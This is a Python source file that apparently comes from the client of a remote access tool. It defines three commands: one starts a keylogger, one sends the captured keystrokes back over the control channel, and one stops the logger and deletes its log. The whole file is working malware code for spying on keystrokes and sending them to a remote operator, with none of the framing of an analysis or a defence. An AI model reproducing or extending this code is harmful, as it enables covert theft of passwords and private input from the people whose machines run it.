from client.commands.base import Command
from client.modules.keylogger import Keylogger


class KeylogStartCommand(Command):
    name = 'keylog_start'

    def execute(self, ctx, raw: str):
        ctx.keylogger = Keylogger()
        ctx.keylogger_thread = ctx.keylogger.start_async()
        ctx.protocol.send('[+] Keylogger started')
        return True


class KeylogDumpCommand(Command):
    name = 'keylog_dump'

    def execute(self, ctx, raw: str):
        if ctx.keylogger:
            ctx.protocol.send(ctx.keylogger.read_logs())
        else:
            ctx.protocol.send('[-] Keylogger is not running')
        return True


class KeylogStopCommand(Command):
    name = 'keylog_stop'

    def execute(self, ctx, raw: str):
        if ctx.keylogger:
            ctx.keylogger.self_destruct()
            ctx.keylogger = None
            ctx.keylogger_thread = None
            ctx.protocol.send('[+] Keylogger stopped and log deleted')
        else:
            ctx.protocol.send('[-] Keylogger is not running')
        return True
